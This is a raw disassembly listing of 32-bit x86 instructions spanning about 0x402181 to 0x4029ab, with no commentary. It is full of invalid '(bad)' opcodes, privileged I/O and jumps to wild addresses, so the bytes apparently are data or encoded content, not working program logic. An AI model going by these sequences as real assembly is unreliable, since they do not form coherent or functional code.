  402181:	pushf  
  402182:	js     0x4021d9
  402184:	dec    esp
  402185:	hlt    
  402186:	les    ecx,FWORD PTR [edx-0x28a30b82]
  40218c:	mov    ah,0x62
  40218e:	mov    ecx,0x19b29e1a
  402193:	jo     0x402165
  402195:	mov    eax,ds:0xd39bbfe7
  40219a:	mov    ds:0x79c93a41,eax
  40219f:	pop    ebp
  4021a0:	push   ecx
  4021a1:	mov    eax,ds:0xf6731ff6
  4021a6:	sbb    esi,edx
  4021a8:	inc    ebx
  4021a9:	adc    ah,BYTE PTR [esi-0x3a702d7e]
  4021af:	jl     0x402131
  4021b1:	mov    ch,0xd9
  4021b3:	xchg   edi,eax
  4021b4:	adc    edx,DWORD PTR [edi]
  4021b6:	xor    eax,0x1eda3a1a
  4021bb:	jbe    0x40221d
  4021bd:	cmc    
  4021be:	cdq    
  4021bf:	mov    DWORD PTR [ebp+0x2701f93f],esp
  4021c5:	jne    0x4021b8
  4021c7:	enter  0x9b05,0x5c
  4021cb:	xchg   ecx,eax
  4021cc:	adc    ebx,DWORD PTR [edx+0x3f]
  4021cf:	jno    0x40218a
  4021d1:	or     eax,0x285e1dd8
  4021d6:	bound  edi,QWORD PTR [ecx-0x20]
  4021d9:	add    eax,0xd5085d0d
  4021de:	cmp    eax,0x86b488e7
  4021e3:	dec    ebx
  4021e4:	cmp    ebp,DWORD PTR [ebp+0x1fb52bc3]
  4021ea:	aas    
  4021eb:	sti    
  4021ec:	add    DWORD PTR [edi+0x71299084],0x28d88b96
  4021f6:	fs sub ch,ch
  4021f9:	fisttp QWORD PTR [ecx-0x1941838b]
  4021ff:	fmul   st(0),st
  402201:	in     eax,dx
  402202:	pop    esi
  402203:	sub    esp,DWORD PTR [esi]
  402205:	fidivr WORD PTR [ebx]
  402207:	xchg   BYTE PTR gs:[eax-0x3c997dc9],ah
  40220e:	mov    dl,ah
  402210:	push   esi
  402211:	sub    eax,0xdae20e1d
  402217:	leave  
  402218:	pop    ebp
  402219:	inc    ebx
  40221a:	out    dx,al
  40221b:	pop    edx
  40221c:	sub    al,0xa7
  40221e:	daa    
  40221f:	jmp    0x3f77e375
  402224:	xor    DWORD PTR [esi-0x54db1e8b],esi
  40222a:	inc    edx
  40222b:	dec    edi
  40222c:	popf   
  40222d:	gs ret 0xb10f
  402231:	bound  eax,QWORD PTR [eax]
  402233:	xor    cl,BYTE PTR [ecx+0xfa8d639]
  402239:	adc    bh,cl
  40223b:	mov    ch,0xa6
  40223d:	repnz cld 
  40223f:	adc    al,0xe2
  402241:	or     al,0xd2
  402243:	pop    edx
  402244:	in     eax,0x4d
  402246:	mov    ebx,0x93c3b998
  40224b:	dec    esp
  40224c:	je     0x402278
  40224e:	cwde   
  40224f:	mov    edx,0xd8aebf56
  402254:	add    ebx,edx
  402256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402257:	ss xchg edi,eax
  402259:	rcl    DWORD PTR [esi-0x2c45c7a0],1
  40225f:	cmp    dl,bh
  402261:	lahf   
  402262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402263:	jns    0x402226
  402265:	int3   
  402266:	push   ss
  402267:	fidiv  DWORD PTR [ecx+edx*8]
  40226a:	std    
  40226b:	call   0x65037db1
  402270:	outs   dx,BYTE PTR ds:[esi]
  402271:	mov    ds:0xa7185cbf,al
  402276:	mov    ch,ch
  402278:	or     BYTE PTR [ebp-0x70e65d8b],0x9d
  40227f:	add    DWORD PTR [ecx+0x17],0x1c16259f
  402286:	stc    
  402287:	fld    QWORD PTR [esi]
  402289:	mov    edi,0x9017ec86
  40228e:	pop    ebx
  40228f:	inc    eax
  402290:	mov    bl,0xc5
  402292:	mov    ds:0x35ec4bfc,eax
  402297:	inc    ebp
  402298:	mov    ebp,0xdc5bd027
  40229d:	push   esi
  40229e:	or     dh,BYTE PTR [esi]
  4022a0:	sar    DWORD PTR [edx+0x18],0xb0
  4022a4:	xor    edi,DWORD PTR [esi+0x6c93a480]
  4022aa:	ds (bad) 
  4022ac:	sbb    al,0xbc
  4022ae:	sbb    eax,0x77b57d0c
  4022b3:	dec    ebp
  4022b4:	aad    0x8d
  4022b6:	(bad)  gs:[esi]
  4022b9:	push   edi
  4022ba:	mov    al,ds:0x2ad1d61b
  4022bf:	cmp    BYTE PTR [ecx],cl
  4022c1:	rol    DWORD PTR [ecx],cl
  4022c3:	in     al,0x44
  4022c5:	jo     0x402253
  4022c7:	mov    ebp,0x3cef3708
  4022cc:	iret   
  4022cd:	push   esi
  4022ce:	dec    edi
  4022cf:	les    eax,FWORD PTR ds:0x807456be
  4022d5:	lods   eax,DWORD PTR ds:[esi]
  4022d6:	in     al,0x5f
  4022d8:	aad    0x67
  4022da:	dec    esp
  4022db:	inc    edx
  4022dc:	retf   0xe4fe
  4022df:	mov    cl,al
  4022e1:	cdq    
  4022e2:	dec    ebx
  4022e3:	pop    esp
  4022e4:	cmp    ebx,DWORD PTR ds:0xf5d860df
  4022ea:	retf   0x8950
  4022ed:	adc    eax,0xcdade8e4
  4022f2:	ror    DWORD PTR [ebx+0x54],cl
  4022f5:	or     al,0xde
  4022f7:	test   BYTE PTR [eax-0x43],ah
  4022fa:	add    BYTE PTR [eax],dh
  4022fc:	mov    ebx,0x5f5ec103
  402301:	cmp    dl,BYTE PTR [ecx+ebx*8]
  402304:	fidivr DWORD PTR [ecx-0x44]
  402307:	jae    0x4022f5
  402309:	rcr    BYTE PTR [edx+0x1daa38a1],1
  40230f:	vphsubdq ymm15,XMMWORD PTR [edi-0x2e]
  402315:	jno    0x4022eb
  402317:	ret    
  402318:	rcl    DWORD PTR [edx-0xe5715de],1
  40231e:	fst    DWORD PTR [eax-0x135b3434]
  402324:	ds out dx,al
  402326:	cmp    al,0x7d
  402328:	dec    esp
  402329:	adc    al,0x50
  40232b:	stos   BYTE PTR es:[edi],al
  40232c:	inc    esp
  40232d:	mov    DWORD PTR [esi*2+0xaffae28],ebx
  402334:	mov    bh,0xce
  402336:	loop   0x402378
  402338:	push   ebp
  402339:	sub    BYTE PTR [edx+ebx*4],bl
  40233c:	fidivr DWORD PTR [edx]
  40233e:	in     eax,dx
  40233f:	cmp    al,0x65
  402341:	jns    0x402384
  402343:	fld    QWORD PTR [edx+0x49]
  402346:	fdivr  st,st(4)
  402348:	std    
  402349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40234a:	or     al,0x18
  40234c:	xor    bl,dl
  40234e:	mov    ?,WORD PTR [ecx]
  402350:	push   ebx
  402351:	addr16 jbe 0x4023ab
  402354:	xchg   esp,eax
  402355:	and    eax,0x7e69a005
  40235a:	sbb    eax,0x5ab79a77
  40235f:	adc    esp,DWORD PTR [ebp-0x54]
  402362:	fcom   DWORD PTR [eax-0x12]
  402365:	mov    ds:0x874d50a9,eax
  40236a:	lahf   
  40236b:	mov    dl,0xe0
  40236d:	or     ebx,DWORD PTR [edi+0x75]
  402370:	ret    0xeabd
  402373:	jbe    0x402300
  402375:	xchg   edi,eax
  402376:	scas   eax,DWORD PTR es:[edi]
  402377:	and    dl,BYTE PTR [esi]
  402379:	xchg   edi,eax
  40237a:	addr16 pop edx
  40237c:	in     al,dx
  40237d:	xchg   BYTE PTR [ebp-0xa],bl
  402380:	adc    ah,bh
  402382:	jb     0x4023b0
  402384:	dec    esp
  402385:	sbb    BYTE PTR [esi+0x11],0x69
  402389:	mov    esi,0x9db41a19
  40238e:	imul   edi,DWORD PTR ds:0xe1f5e123,0x33ab9909
  402398:	cmp    eax,0x60cb8701
  40239d:	test   al,0x6
  40239f:	out    0x6d,al
  4023a1:	dec    esi
  4023a2:	aaa    
  4023a3:	fist   DWORD PTR [ebx]
  4023a5:	loope  0x402364
  4023a7:	xor    DWORD PTR [eax-0x24ba6ce2],0xf0be86a6
  4023b1:	mov    al,0x5
  4023b3:	test   ch,0x1e
  4023b6:	add    esp,DWORD PTR [eax]
  4023b8:	jecxz  0x4023fd
  4023ba:	adc    DWORD PTR [eax-0x19cd5e95],edi
  4023c0:	push   ds
  4023c1:	mov    ds:0x97795fa5,al
  4023c6:	mov    al,0x12
  4023c8:	and    ecx,DWORD PTR [edi]
  4023ca:	sahf   
  4023cb:	je     0x40238a
  4023cd:	leave  
  4023ce:	jnp    0x402361
  4023d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023d1:	aas    
  4023d2:	dec    eax
  4023d3:	adc    bh,cl
  4023d5:	in     al,0x68
  4023d7:	sbb    BYTE PTR [ebp-0x2b134e88],dl
  4023dd:	icebp  
  4023de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023df:	jne    0x40245f
  4023e1:	fnsave [edi+0x4527ec71]
  4023e7:	pop    eax
  4023e8:	repnz fisttp WORD PTR [eax+edi*4-0x52]
  4023ed:	xor    BYTE PTR [esi],ah
  4023ef:	addr16 cli 
  4023f1:	dec    ecx
  4023f2:	fwait
  4023f3:	jae    0x4023ec
  4023f5:	xor    eax,0xd3311b60
  4023fa:	loop   0x40242a
  4023fc:	(bad)  
  4023fe:	(bad)  
  4023ff:	push   ds
  402400:	es push esi
  402402:	mov    eax,ds:0x4d30830f
  402407:	nop
  402408:	jae    0x4023c2
  40240a:	outs   dx,BYTE PTR ds:[esi]
  40240b:	mov    bh,al
  40240d:	arpl   WORD PTR [edx-0x570ca842],dx
  402413:	test   al,0x48
  402415:	ret    0x26a4
  402418:	std    
  402419:	pushf  
  40241a:	xchg   BYTE PTR ds:0xe9780ae4,bh
  402420:	fidivr DWORD PTR [edx]
  402422:	test   al,0x8a
  402424:	sub    BYTE PTR [ebp*8+0x5006258a],0x98
  40242c:	test   DWORD PTR [esi+0x4d2d2345],edi
  402432:	dec    ebx
  402433:	xchg   esp,eax
  402434:	std    
  402435:	sar    bh,cl
  402437:	mov    WORD PTR [eax-0x6d6021d4],cs
  40243d:	popa   
  40243e:	or     al,0x3e
  402440:	mov    es,WORD PTR [edx-0x14]
  402443:	cmp    dh,bl
  402445:	mov    edi,0x692156b3
  40244a:	inc    eax
  40244b:	mov    BYTE PTR [eax+0x20],dh
  40244e:	sbb    eax,0x82287888
  402453:	adc    al,0x29
  402455:	retf   
  402456:	pop    ebx
  402457:	es sti 
  402459:	xchg   edi,eax
  40245a:	dec    esi
  40245b:	dec    esp
  40245c:	test   BYTE PTR [edx],cl
  40245e:	imul   edi,DWORD PTR [esi-0xf9ddcf3],0x6641f4bb
  402468:	jbe    0x4023ec
  40246a:	jnp    0x402452
  40246c:	pop    esi
  40246d:	or     BYTE PTR [eax-0x5235d52a],bl
  402473:	add    dh,BYTE PTR [eax]
  402475:	and    DWORD PTR [ecx-0x57],esp
  402478:	lods   al,BYTE PTR ds:[esi]
  402479:	cdq    
  40247a:	push   0x58a0e0f2
  40247f:	xor    DWORD PTR [edx-0x39],0xe2a7dc2a
  402486:	dec    ebp
  402487:	out    dx,eax
  402488:	jecxz  0x40241c
  40248a:	mov    ebp,0xe2dedb50
  40248f:	out    0x2a,al
  402491:	pop    ebp
  402492:	(bad)  
  402494:	push   esi
  402495:	je     0x4024d3
  402497:	(bad)  
  402498:	fxch   st(2)
  40249a:	jae    0x402470
  40249c:	(bad)  
  40249d:	outs   dx,DWORD PTR ds:[esi]
  40249e:	in     eax,dx
  40249f:	cmp    BYTE PTR [esi],bh
  4024a1:	or     DWORD PTR [ebx+eiz*4],0x5f935d2a
  4024a8:	inc    esp
  4024a9:	xor    al,0x5f
  4024ab:	sahf   
  4024ac:	stc    
  4024ad:	test   DWORD PTR [edi-0x44],0x318d5257
  4024b4:	test   DWORD PTR [esi],ebx
  4024b6:	or     DWORD PTR [ebx+0x7ac968ad],edi
  4024bc:	mov    ebx,DWORD PTR [esi]
  4024be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024bf:	stc    
  4024c0:	push   ecx
  4024c1:	cli    
  4024c2:	jns    0x402470
  4024c4:	loop   0x402539
  4024c6:	mov    esi,0xb5c7eea5
  4024cb:	and    al,0x3
  4024cd:	mov    eax,0xa44d03d1
  4024d2:	push   ds
  4024d3:	das    
  4024d4:	xchg   edi,eax
  4024d5:	xor    BYTE PTR [ebx-0x3a58346a],cl
  4024db:	test   al,0xbf
  4024dd:	out    dx,eax
  4024de:	sub    ah,al
  4024e0:	inc    ecx
  4024e1:	dec    esp
  4024e2:	lods   eax,DWORD PTR ds:[esi]
  4024e3:	je     0x402472
  4024e5:	loope  0x402557
  4024e7:	pop    edi
  4024e8:	mov    bl,0x5b
  4024ea:	add    BYTE PTR [ecx-0x33e33a],bh
  4024f0:	pop    ecx
  4024f1:	push   0x39
  4024f3:	lods   al,BYTE PTR gs:[esi]
  4024f5:	out    0xe1,eax
  4024f7:	jnp    0x40250c
  4024f9:	mov    ch,0x12
  4024fb:	int3   
  4024fc:	push   es
  4024fd:	mov    al,ds:0x9190bfb
  402502:	clc    
  402503:	(bad)  
  402504:	fimul  DWORD PTR [ecx-0x95eb3b5]
  40250a:	mov    esi,0xa190cd9a
  40250f:	or     DWORD PTR [edi-0x60fb0a62],0x3a
  402516:	dec    ebx
  402517:	test   DWORD PTR [edx],ebp
  402519:	pop    esi
  40251a:	jo     0x4024de
  40251c:	mul    ecx
  40251e:	das    
  40251f:	fcmovne st,st(1)
  402521:	inc    edx
  402522:	cmp    bl,BYTE PTR [edi-0x4a]
  402525:	sbb    edi,DWORD PTR [esi]
  402527:	ss stos DWORD PTR es:[edi],eax
  402529:	fmul   QWORD PTR [edi+0x20]
  40252c:	and    bh,BYTE PTR [ecx-0x43151f83]
  402532:	loopne 0x4025a9
  402534:	push   DWORD PTR [edi-0x4f]
  402537:	adc    bl,BYTE PTR ds:0x322dd82e
  40253d:	add    dl,BYTE PTR ds:0xe5a603bb
  402543:	push   eax
  402544:	pop    ecx
  402545:	dec    esi
  402546:	jmp    0x54a8:0xe3d7952a
  40254d:	jp     0x40255f
  40254f:	loop   0x4025bd
  402551:	jg     0x402576
  402553:	data16 out dx,al
  402555:	rol    dl,cl
  402557:	aam    0x73
  402559:	jge    0x402544
  40255b:	ds or  eax,eax
  40255e:	jle    0x4025a5
  402560:	fsubr  DWORD PTR [edi-0x7eb12d92]
  402566:	jmp    0x5675d110
  40256b:	jl     0x4025ea
  40256d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40256e:	fcomp  QWORD PTR [ecx+0x70]
  402571:	sub    BYTE PTR [eax+0xb9deaa0],al
  402577:	gs lock aam 0x2b
  40257b:	imul   edx,DWORD PTR [edi],0x99d4b9bd
  402581:	sbb    eax,edi
  402583:	sub    ecx,edx
  402585:	pop    edi
  402586:	call   0x22365d7d
  40258b:	xchg   ecx,eax
  40258c:	mov    ebp,cs
  40258e:	lahf   
  40258f:	(bad)  
  402590:	sbb    dh,BYTE PTR [ebx-0x7b69c1c3]
  402596:	or     al,0x9
  402598:	mov    ecx,0x1faa37d8
  40259d:	popa   
  40259e:	js     0x4025fc
  4025a0:	test   eax,0xf6dce39d
  4025a5:	ror    BYTE PTR [esi+0x246bc071],cl
  4025ab:	mov    eax,0x9f8d7b1b
  4025b0:	lds    esp,FWORD PTR [esi+0x35]
  4025b3:	out    dx,eax
  4025b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025b5:	sbb    eax,0x338bcef4
  4025ba:	ret    0x6982
  4025bd:	aam    0x2c
  4025bf:	dec    edx
  4025c0:	fs xchg edx,eax
  4025c2:	mov    cl,0x21
  4025c4:	mov    edx,0x4a320083
  4025c9:	pop    ebp
  4025ca:	outs   dx,BYTE PTR ds:[esi]
  4025cb:	jmp    0x4515e955
  4025d0:	inc    edi
  4025d1:	or     dl,BYTE PTR [eax-0x3ade1a25]
  4025d7:	mov    eax,0xe291711c
  4025dc:	clc    
  4025dd:	sbb    ebp,eax
  4025df:	retf   0x40c0
  4025e2:	lods   eax,DWORD PTR ds:[esi]
  4025e3:	repnz xor DWORD PTR [edx],esi
  4025e6:	sub    BYTE PTR [ebx-0x1ca38e46],ah
  4025ec:	sti    
  4025ed:	nop
  4025ee:	jnp    0x4025c5
  4025f0:	rcl    DWORD PTR [edi*1+0x139c314],1
  4025f7:	sbb    bh,BYTE PTR [ebx-0x6a]
  4025fa:	popa   
  4025fb:	xchg   BYTE PTR [edi],bh
  4025fd:	call   0x5c56:0xb584445d
  402604:	sub    BYTE PTR [ebp+0x5744dfd5],ah
  40260a:	repnz cmp BYTE PTR [eax-0x17],dl
  40260e:	mov    ebp,DWORD PTR [edx+ebx*8+0x2f]
  402612:	test   al,0xde
  402614:	lods   eax,DWORD PTR ds:[esi]
  402615:	or     esp,ebx
  402617:	push   0x4e1b8032
  40261c:	(bad)  
  40261d:	mov    ds:0x9f0d0e1b,al
  402622:	in     al,dx
  402623:	adc    bl,BYTE PTR [ecx]
  402625:	inc    ecx
  402626:	imul   ecx,DWORD PTR [ebx+0xc63ff86],0xffffff96
  40262d:	sbb    ch,bh
  40262f:	scas   al,BYTE PTR es:[edi]
  402630:	cwde   
  402631:	sub    eax,0xff5843f8
  402636:	inc    esp
  402637:	sbb    esp,esp
  402639:	jnp    0x4025c8
  40263b:	mov    dl,0xcf
  40263d:	popa   
  40263e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40263f:	add    BYTE PTR [ecx-0x4d],dh
  402642:	repnz adc al,0x9
  402645:	mov    edx,0xd6f35d3f
  40264a:	sbb    ebp,DWORD PTR [edi]
  40264c:	mov    dh,0x53
  40264e:	es stc 
  402650:	pusha  
  402651:	gs (bad) 
  402653:	or     BYTE PTR [eax+0x7],dh
  402656:	sahf   
  402657:	aam    0xa5
  402659:	nop
  40265a:	daa    
  40265b:	jbe    0x4025f4
  40265d:	icebp  
  40265e:	mov    ?,WORD PTR [esi+0x2be53f5e]
  402664:	cs out dx,eax
  402666:	(bad)  
  402667:	(bad)  
  402668:	xchg   esi,eax
  402669:	outs   dx,DWORD PTR ds:[esi]
  40266a:	mov    di,0x66b8
  40266e:	dec    eax
  40266f:	(bad)  
  402670:	in     al,0x98
  402672:	outs   dx,DWORD PTR ds:[esi]
  402673:	cmp    eax,0xd4e5f925
  402678:	pop    es
  402679:	mov    esi,0x7ec90319
  40267e:	mov    WORD PTR [eax-0x53e988d3],ss
  402684:	mov    eax,0x53e5cef1
  402689:	pop    esp
  40268a:	sub    al,0x7d
  40268c:	aas    
  40268d:	mov    bl,BYTE PTR [edi-0x1e]
  402690:	mov    esi,0x1dc8bafa
  402695:	dec    edi
  402696:	pop    edi
  402697:	les    esi,FWORD PTR [ebp-0x10]
  40269a:	mov    ah,0x65
  40269c:	repz jnp 0x40266c
  40269f:	jle    0x40262a
  4026a1:	jmp    0x402711
  4026a3:	pop    es
  4026a4:	inc    ebx
  4026a5:	push   eax
  4026a6:	jb     0x402714
  4026a8:	bound  esi,QWORD PTR [esi-0x7]
  4026ab:	outs   dx,DWORD PTR ds:[esi]
  4026ac:	pop    esp
  4026ad:	dec    eax
  4026ae:	gs mov esp,0xa349c76d
  4026b4:	mov    al,bh
  4026b6:	cmp    DWORD PTR [eax+0x20d660c0],esp
  4026bc:	mov    ebx,0x187a8b8e
  4026c1:	push   0xb3043d89
  4026c6:	cs cld 
  4026c8:	mov    ecx,0x4d402675
  4026cd:	int3   
  4026ce:	fwait
  4026cf:	mul    bl
  4026d1:	xchg   ecx,eax
  4026d2:	cwde   
  4026d3:	call   0xfbd:0x70713b15
  4026da:	mov    esi,0xa429ab39
  4026df:	jmp    0x2d87:0xb593fe29
  4026e6:	cmc    
  4026e7:	pop    ecx
  4026e8:	xchg   edi,eax
  4026e9:	addr16 aam 0x47
  4026ec:	sub    al,0xd
  4026ee:	lods   eax,DWORD PTR ds:[esi]
  4026ef:	mov    eax,ds:0x90cf3656
  4026f4:	daa    
  4026f5:	or     cl,BYTE PTR [ebx+0x2a20bbbb]
  4026fb:	jp     0x402690
  4026fd:	pop    ebp
  4026fe:	loopne 0x402731
  402700:	and    eax,0x85c8a3dd
  402705:	cld    
  402706:	jecxz  0x4026c3
  402708:	sub    eax,DWORD PTR [edi]
  40270a:	or     al,0xc0
  40270c:	outs   dx,BYTE PTR ds:[esi]
  40270d:	inc    ebp
  40270e:	push   esi
  40270f:	and    DWORD PTR [eax+0x20],0x567377e8
  402716:	jg     0x4026ad
  402718:	fld    TBYTE PTR [ebx+ebp*1]
  40271b:	sub    eax,eax
  40271d:	mov    edx,0x3232dd10
  402722:	jle    0x40278d
  402724:	adc    bl,ch
  402726:	cmp    edi,edi
  402728:	lock outs dx,BYTE PTR ds:[esi]
  40272a:	cli    
  40272b:	test   eax,0x54aace73
  402730:	sub    eax,0x9339ddca
  402735:	ss sub esi,esp
  402738:	dec    ebx
  402739:	aam    0x99
  40273b:	push   edx
  40273c:	mov    eax,ds:0xe43e32ba
  402741:	mov    al,0x39
  402743:	pop    ecx
  402744:	gs mov edi,0x568dde81
  40274a:	inc    ebp
  40274b:	mov    esi,0xc11fb3c0
  402750:	jp     0x4027c1
  402752:	out    0x6c,al
  402754:	fbstp  TBYTE PTR [esi+0x39eab4f]
  40275a:	and    bh,dh
  40275c:	ret    
  40275d:	idiv   BYTE PTR [ecx-0x2980fc55]
  402763:	nop
  402764:	add    DWORD PTR [edx+edi*8],ebp
  402767:	retf   0x1fd7
  40276a:	std    
  40276b:	repnz and ebp,DWORD PTR [ecx+0xf]
  40276f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402770:	mov    DWORD PTR [edi-0x39083364],edi
  402776:	out    dx,eax
  402777:	jbe    0x40271f
  402779:	sbb    ebp,edi
  40277b:	mov    dh,0x56
  40277d:	fidivr WORD PTR [edx]
  40277f:	(bad)  
  402780:	lahf   
  402781:	cmc    
  402782:	mov    ds:0x5fa70eda,al
  402787:	xchg   BYTE PTR [esi],ah
  402789:	push   cs
  40278a:	mov    eax,0xfa2e90ea
  402790:	data16 mov dh,0x7c
  402793:	leave  
  402794:	add    DWORD PTR [esi],edi
  402796:	push   0xe7f84444
  40279b:	cld    
  40279c:	xor    bl,cl
  40279e:	lahf   
  40279f:	sti    
  4027a0:	jno    0x402774
  4027a2:	jno    0x40274c
  4027a4:	dec    ecx
  4027a5:	push   ss
  4027a6:	hlt    
  4027a7:	adc    eax,DWORD PTR [ebx-0x5528fe01]
  4027ad:	test   BYTE PTR [ebp*1-0x657ff673],0x1
  4027b5:	mul    DWORD PTR [ecx]
  4027b7:	icebp  
  4027b8:	mov    al,ds:0x36b7adf7
  4027bd:	test   BYTE PTR [edi-0x6e3c6bee],dl
  4027c3:	sub    ebp,DWORD PTR [ebx-0x64eb66b0]
  4027c9:	push   ebx
  4027ca:	inc    edi
  4027cb:	shr    BYTE PTR es:[ebx],cl
  4027ce:	mov    DWORD PTR [esi+0x795e65c0],ecx
  4027d4:	mov    ds:0xa77927d1,al
  4027d9:	add    edx,DWORD PTR [edi]
  4027db:	ja     0x402773
  4027dd:	into   
  4027de:	inc    esi
  4027df:	retf   0xb5c7
  4027e2:	push   ss
  4027e3:	push   eax
  4027e4:	fcmovb st,st(5)
  4027e6:	ret    
  4027e7:	jmp    0x4027f3
  4027e9:	sub    al,0x74
  4027eb:	mov    al,ds:0xab6a2fc7
  4027f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027f1:	adc    BYTE PTR [ebx],dl
  4027f3:	call   0x757376c2
  4027f8:	data16 sub al,BYTE PTR [esi]
  4027fb:	repz jo 0x402863
  4027fe:	xor    ebp,ebp
  402800:	mov    dh,0x5d
  402802:	fsub   QWORD PTR [esi]
  402804:	xchg   esi,eax
  402805:	addr16 jns 0x402825
  402808:	and    esi,DWORD PTR [esi]
  40280a:	inc    edi
  40280b:	sar    DWORD PTR [edi],1
  40280d:	loop   0x4027df
  40280f:	dec    esi
  402810:	mov    ecx,0xf6b5c023
  402815:	icebp  
  402816:	push   0x7c
  402818:	push   ss
  402819:	data16 xor BYTE PTR [ecx-0x25fe0937],0xc9
  402821:	add    eax,DWORD PTR [eiz*2-0x76796161]
  402828:	or     BYTE PTR [edi+esi*4+0x43],cl
  40282c:	add    al,0x15
  40282e:	sbb    eax,0xcd703371
  402833:	mov    ds:0xf74a03de,al
  402838:	mov    esi,0xa64e62cf
  40283d:	stos   DWORD PTR es:[edi],eax
  40283e:	xchg   esi,eax
  40283f:	test   al,0x10
  402841:	(bad)  
  402842:	mov    bh,0x45
  402844:	push   ss
  402845:	imul   ebx,DWORD PTR [esi+0x7dff8807],0x35c9f956
  40284f:	sub    DWORD PTR [ecx],ecx
  402851:	cmp    al,0xd2
  402853:	push   ecx
  402854:	arpl   WORD PTR ds:0xf4a8464b,ax
  40285a:	and    cl,BYTE PTR [edx+0x50780cff]
  402860:	jne    0x4028b3
  402862:	dec    ecx
  402863:	mov    cl,0xec
  402865:	call   0xd695e86
  40286a:	xchg   esp,eax
  40286b:	leave  
  40286c:	jl     0x402854
  40286e:	(bad)  
  40286f:	(bad)  
  402870:	inc    ebp
  402871:	jmp    0x40288a
  402873:	lahf   
  402874:	jle    0x4028a1
  402876:	es inc ebp
  402878:	cmc    
  402879:	stos   BYTE PTR es:[di],al
  40287b:	arpl   WORD PTR [edi+0x14375e8a],di
  402881:	or     BYTE PTR [esp+esi*1],bl
  402884:	es fcmovu st,st(1)
  402887:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402888:	daa    
  402889:	ficomp DWORD PTR ds:0xe47cf78a
  40288f:	jmp    0x36b872a7
  402894:	mov    ds:0x6db15489,eax
  402899:	sbb    cl,ah
  40289b:	cs inc edi
  40289d:	(bad)
  4028a1:	mov    dh,0x5a
  4028a3:	dec    eax
  4028a4:	dec    ecx
  4028a5:	js     0x402887
  4028a7:	jl     0x402881
  4028a9:	mov    bl,0x58
  4028ab:	loopne 0x4028a0
  4028ad:	gs std 
  4028af:	jnp    0x4028b0
  4028b1:	mov    ebp,0x7837cd93
  4028b6:	stos   BYTE PTR es:[edi],al
  4028b7:	das    
  4028b8:	mov    eax,0x4458caf
  4028bd:	cmp    DWORD PTR [eax-0x1d9da83e],0x5e
  4028c4:	cmc    
  4028c5:	fcmovne st,st(3)
  4028c7:	(bad)  
  4028c8:	sahf   
  4028c9:	jmp    0x402940
  4028cb:	lods   al,BYTE PTR ds:[esi]
  4028cc:	nop
  4028cd:	addr16 call 0xbbe4d1ec
  4028d3:	jg     0x4028ab
  4028d5:	(bad)  
  4028d6:	out    dx,al
  4028d7:	and    eax,0xad14714a
  4028dc:	push   0xe06be4f9
  4028e1:	dec    edx
  4028e2:	inc    ecx
  4028e3:	push   ds
  4028e4:	mov    ecx,0x7e968e1c
  4028e9:	jns    0x402904
  4028eb:	repnz stc 
  4028ed:	or     BYTE PTR [eax],ch
  4028ef:	jns    0x402960
  4028f1:	(bad)  
  4028f2:	enter  0xd789,0x27
  4028f6:	loope  0x402934
  4028f8:	jo     0x4028bc
  4028fa:	and    al,0x9e
  4028fc:	arpl   bp,ax
  4028fe:	in     eax,0x43
  402900:	mov    esp,0x71dc2331
  402905:	clc    
  402906:	inc    esp
  402907:	jbe    0x4028a4
  402909:	test   DWORD PTR [eax-0x10],ecx
  40290c:	(bad)  
  40290d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40290e:	(bad)  
  40290f:	jge    0x402904
  402911:	pop    edi
  402912:	shl    DWORD PTR [ebp+edi*1-0x4966ebf3],cl
  402919:	cwde   
  40291a:	push   esi
  40291b:	pop    edi
  40291c:	shr    BYTE PTR [esi],1
  40291e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40291f:	leave  
  402920:	cmp    BYTE PTR [edx-0x65e4c823],0x3d
  402927:	and    eax,0x9ef3dad6
  40292c:	xlat   BYTE PTR ds:[ebx]
  40292d:	pop    esi
  40292e:	fmul   QWORD PTR [edi-0x566dff2c]
  402934:	into   
  402935:	or     al,0xd0
  402937:	sbb    DWORD PTR [ebp-0x15],esp
  40293a:	(bad)  
  40293b:	(bad)  
  40293d:	fld    TBYTE PTR [eax+0x6d3c30b8]
  402943:	enter  0xa97e,0xb9
  402947:	imul   ecx,DWORD PTR [esi+ebp*1],0x7775b007
  40294e:	mov    eax,0xcfa5f5a8
  402953:	ins    DWORD PTR es:[edi],dx
  402954:	and    DWORD PTR [ebx],ebp
  402956:	(bad)  
  402958:	loopne 0x402993
  40295a:	mov    al,0x3a
  40295c:	cli    
  40295d:	(bad)  
  40295e:	out    dx,al
  40295f:	sar    BYTE PTR [esi-0x28],1
  402962:	aaa    
  402963:	jle    0x4029c7
  402965:	shl    BYTE PTR [edi+0x5a],1
  402968:	jecxz  0x4029e5
  40296a:	fadd   QWORD PTR [ecx]
  40296c:	ins    DWORD PTR es:[edi],dx
  40296d:	rol    cl,cl
  40296f:	(bad)  [ebx+0xde78a5f]
  402975:	stos   BYTE PTR es:[edi],al
  402976:	jmp    DWORD PTR [ebp-0x76e35dc7]
  40297c:	cli    
  40297d:	sti    
  40297e:	sbb    ah,dl
  402980:	sub    bl,cl
  402982:	xchg   esi,eax
  402983:	mov    ds:0xb279198d,eax
  402988:	cld    
  402989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40298a:	mov    cs,edx
  40298c:	pop    esi
  40298d:	push   esp
  40298e:	pop    ecx
  40298f:	ja     0x402929
  402991:	and    dl,BYTE PTR [eax-0x3236a1e]
  402997:	mov    eax,0x981ac1d9
  40299c:	xchg   ebp,eax
  40299d:	dec    esi
  40299e:	lods   al,BYTE PTR ds:[esi]
  40299f:	or     eax,edx
  4029a1:	into   
  4029a2:	dec    ebx
  4029a3:	sub    al,0x4
  4029a5:	and    eax,0x15723310
  4029aa:	sti    
  4029ab:	test   esp,0x1dfc06da
